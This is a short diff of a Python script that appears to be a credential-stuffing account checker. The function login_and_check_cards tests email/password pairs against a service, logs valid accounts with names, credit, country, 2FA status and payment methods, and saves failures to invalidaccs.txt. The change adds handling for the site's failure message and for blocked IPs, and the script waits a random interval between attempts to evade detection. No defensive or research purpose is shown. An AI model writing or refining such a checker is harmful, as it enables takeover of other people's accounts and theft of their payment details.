@@ -66,11 +66,15 @@ def login_and_check_cards(email, password):
                 valid_file.write("NO PAYMENT METHOD\n")
             valid_file.write('\n') 
         print(f'[ {Fore.GREEN}ACCOUNT VALID - {email}|{password}{Fore.RESET} | {Fore.YELLOW}UserID: {userid} - Firstname: {firstname} - Lastname: {lastname} - Account Credit: {credit} {currency} - Country: {country} - 2FA Enabled: {Fore.GREEN if twofa_enabled else Fore.RED}{twofa_enabled}{Fore.RESET}{Fore.YELLOW} - Account Status: {Fore.GREEN if status == "Active" else Fore.RED}{status}{Fore.RESET} ]')
-
-    else:
+        
+    elif 'auth":"We' in response.text:
         with open('invalidaccs.txt', 'a') as invalid_file:
             invalid_file.write(f'Invalid Account: {email}\n\n')
         print(f'[{Fore.RED} ACCOUNT INVALID - {email}|{password} {Fore.RESET}]')
+        
+    else:
+        print(f'[{Fore.RED} ERROR - YOUR IP BLOCKED OR HOST DOWN {Fore.RESET}]')
+        
     time.sleep(random.uniform(1, 5))
 
 def main():
